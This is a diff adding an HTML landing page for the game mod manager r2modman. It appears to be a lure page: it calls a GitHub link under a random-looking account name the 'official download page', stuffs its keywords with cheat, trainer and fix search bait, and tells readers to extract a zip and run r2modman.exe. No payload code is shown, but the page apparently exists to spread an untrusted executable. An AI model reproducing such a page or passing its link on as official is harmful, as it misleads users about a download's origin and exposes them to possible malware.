@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="r2modman - Thunderstore mod manager for Valheim and more. Install, update, Linux build. Profile per game, download mods, launch. Windows zip, extract and play. Free download.">
+    <meta name="keywords" content="lethal-company-community,lethal-company-morecompany-cosmestics,lethal-company-multiplayer-not-working-fix,lethalcompany,mod-manager,r2modman,r2modmanager,r2modmanplus,repo-mod,risk-of-rain,risk-of-rain-2,risk-of-rain-returns,risk-of-rain2,riskofrain,valheim,valheim-cheat-engine-table-windows-11,valheim-mod-manager-,valheim-not-launching-windows-11,valheim-setup,valheim-trainer-2026">
+    <meta name="author" content="r2modman">
+    <meta property="og:title" content="r2modman - Mod Manager Made Easy">
+    <meta property="og:description" content="Download and manage mods for Valheim, Risk of Rain 2, Lethal Company, and more. Simple, free, and fast.">
+    <meta property="og:url" content="https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman">
+    <title>r2modman - Thunderstore Mod Manager | Free Download</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎮</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            line-height: 1.7;
+            color: #2c3e50;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            overflow: hidden;
+            padding: 2.5rem;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: #1a1a2e;
+            margin-bottom: 1.2rem;
+            text-align: center;
+            line-height: 1.2;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #16213e;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #3498db;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #2c3e50;
+            margin: 1.5rem 0 0.8rem;
+        }
+        p {
+            margin-bottom: 1.2rem;
+            font-size: 1.05rem;
+        }
+        .button {
+            display: inline-block;
+            background: linear-gradient(45deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 16px 40px;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            text-decoration: none;
+            box-shadow: 0 4px 20px rgba(231, 76, 60, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 0 auto 2rem;
+            text-align: center;
+            display: block;
+            width: fit-content;
+            border: none;
+            cursor: pointer;
+        }
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 25px rgba(231, 76, 60, 0.5);
+        }
+        .button.alt {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            box-shadow: 0 4px 20px rgba(52, 152, 219, 0.4);
+        }
+        .button.alt:hover {
+            box-shadow: 0 6px 25px rgba(52, 152, 219, 0.5);
+        }
+        ul, ol {
+            margin: 1rem 0 1.5rem 2rem;
+            font-size: 1.05rem;
+        }
+        li {
+            margin-bottom: 0.6rem;
+        }
+        .highlight {
+            background: #fff3cd;
+            border-left: 5px solid #ffc107;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+        }
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .feature-card {
+            flex: 1 1 240px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 1.5rem;
+            border: 1px solid #e9ecef;
+            transition: transform 0.2s;
+        }
+        .feature-card:hover {
+            transform: scale(1.02);
+        }
+        .feature-card h4 {
+            font-size: 1.1rem;
+            margin-bottom: 0.8rem;
+            color: #2c3e50;
+        }
+        .download-section {
+            background: #eef7ff;
+            border-radius: 16px;
+            padding: 2rem;
+            margin: 2.5rem 0;
+            border: 1px solid #b8d4f0;
+            text-align: center;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background: #ddd;
+            margin: 2.5rem 0;
+        }
+        .badge {
+            display: inline-block;
+            padding: 0.4rem 1rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            background: #2ecc71;
+            color: white;
+            margin-right: 0.5rem;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 1.5rem;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            .button {
+                font-size: 1.1rem;
+                padding: 14px 30px;
+            }
+            .features {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎮 r2modman - Mod Manager Made Simple</h1>
+        <p style="text-align:center;font-size:1.3rem;color:#7f8c8d;margin-bottom:2rem">The easiest way to enhance your favorite games</p>
+        
+        <a href="https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman" class="button">📥 Visit Link to Download Application</a>
+        
+        <div class="highlight">
+            <strong>⚠️ Important:</strong> This link will take you to the official download page where you can get the latest version of r2modman.
+        </div>
+
+        <h2>🚀 What is r2modman?</h2>
+        <p>r2modman is a powerful yet easy-to-use mod manager that works seamlessly with popular games like Valheim, Risk of Rain 2, Lethal Company, and many more. It's designed to help you install, organize, and manage game modifications without any technical hassle. Whether you're modding for the first time or you're a seasoned veteran, r2modman makes the entire process smooth and straightforward.</p>
+
+        <h2>⭐ Why Choose r2modman?</h2>
+        <p>Unlike other mod managers, r2modman was built from the ground up with the average gamer in mind. Here's what makes it special:</p>
+        <div class="features">
+            <div class="feature-card">
+                <h4>📦 Simple Installation</h4>
+                <p>No complex configuration needed. Download, extract, and you're ready to go.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🔄 Automatic Updates</h4>
+                <p>Keep your mods current without lifting a finger. r2modman handles it all.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🎯 Game Profiles</h4>
+                <p>Create separate profiles for each game or even different playthroughs. Switch between them instantly.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🐧 Cross-Platform Support</h4>
+                <p>Includes a dedicated Linux build so you can enjoy modding no matter your OS.</p>
+            </div>
+        </div>
+
+        <h2>📥 How to Download and Install</h2>
+        <div class="download-section">
+            <p style="font-size:1.2rem;margin-bottom:1.5rem"><strong>Following these simple steps:</strong></p>
+            <ol style="text-align:left">
+                <li><strong>Click the download button</strong> above or use the direct link: <a href="https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman">https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman</a>. This link will take you to the official download page for r2modman.</li>
+                <li><strong>Find the correct version</strong> for your system (Windows is most common).</li>
+                <li><strong>Visit this link to download the application.</strong> The files will be delivered to your browser's download folder.</li>
+                <li><strong>Extract the downloaded files</strong> to a location you can easily find, like your Desktop or Documents folder.</li>
+                <li><strong>Double-click to run</strong> the r2modman.exe file. No installation wizard needed – it just works!</li>
+            </ol>
+            <a href="https://github.com/Irreplaceablenessperiodicalcicada2355/r2modman" class="button alt" style="margin-top:1rem">📥 Download Now</a>
+        </div>
+
+        <h2>🛠️ How to Use r2modman</h2>
+        <h3>Getting Started With Your First Game</h3>
+        <ol>
+            <li><strong>Launch r2modman</strong> – You'll see a game selector screen.</li>
+            <li><strong>Choose a game</strong> – Select from Valheim, Risk of Rain 2, Lethal Company, or any supported title in the list.</li>
+            <li><strong>Create a profile</strong> – Give your mod setup a name (e.g., "My First Mods").</li>
+            <li><strong>Browse mods</strong> – The integrated Thunderstore browser shows thousands of community-created mods.</li>
+            <li><strong>Install mods</strong> – Click "Install" on any mod, and r2modman handles everything automatically.</li>
+            <li><strong>Launch the game</strong> – Press the play button, and r2modman starts your game with all mods loaded.</li>
+        </ol>
+
+        <div class="highlight">
+            <strong>💡 Pro Tip:</strong> If your game isn't launching or mods aren't working, check that all dependencies are installed. r2modman marks required dependencies automatically so you know what to add.
+        </div>
+
+        <h2>🎉 Supported Games</h2>
+        <p>r2modman works brilliantly with a growing list of games. Current community favorites include:</p>
+        <ul>
+            <li><strong>Valheim</strong> – The Viking survival phenomenon</li>
+            <li><strong>Risk of Rain 2</strong> – The action-packed roguelike</li>
+            <li><strong>Lethal Company</strong> – The co-op horror hit</li>
+            <li><strong>And many more!</strong> - Support for additional games is continuously added.</li>
+        </ul>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <h3>Is r2modman really free?</h3>
+        <p><strong>Yes, 100%!</strong> r2modman is completely free to download and use. There's no premium tier, no paywall, and no hidden costs.</p>
+
+        <h3>Will it work on my computer?</h3>
+        <p>If your computer can run the games you want to mod, it can run r2modman. The application is lightweight and uses minimal system resources. No special hardware required.</p>
+
+        <h3>What if I break something?</h3>
+        <p>No worries! r2modman creates a safe environment for each game profile. You can revert changes instantly and even wipe everything clean without affecting your actual game files.</p>
+
+        <h3>Can I play online with mods?</h3>
+        <p>Most games allow modded play, but it depends on the game's rules and the specific mod. r2modman makes it easy to switch between modded and vanilla profiles so you can play however you prefer.</p>
+
+        <h2>🔧 Troubleshooting Common Issues</h2>
+        <h3>Mods not working?</h3>
+        <ul>
+            <li>Make sure you've installed the mod's required dependencies</li>
+            <li>Always check the mod's compatibility with your current game version</li>
+            <li>Try creating a fresh profile and adding mods one at a time</li>
+        </ul>
+
+        <h3>Game won't launch?</h3>
+        <ul>
+            <li>Continue to launch the game through the r2modman play button</li>
+            <li>Verify the game's integrity via Steam or your game client</li>
+            <li>Update all mods to their latest versions</li>
+        </ul>
+
+        <h2>📞 Get Help</h2>
+        <p>Experiencing issues or have questions? The community is here to help. Join our Discord server, browse the GitHub discussions, or check out community forums dedicated to your favorite games. There's always someone willing to explain things in plain English.</p>
+
+        <hr>
+
+        <footer style="text-align:center;margin-top:2rem;padding-top:1.5rem;border-top:2px solid #eee">
+            <p style="font-size:0.9rem;color:#999">© 2025 r2modman. All rights reserved. Not affiliated with Thunderstore or any game developer.</p>
+            <p style="font-size:0.9rem;color:#999">r2modman is free and always will be. Enjoy your enhanced gaming experience!</p>
+        </footer>
+    </div>
+</body>
+</html>
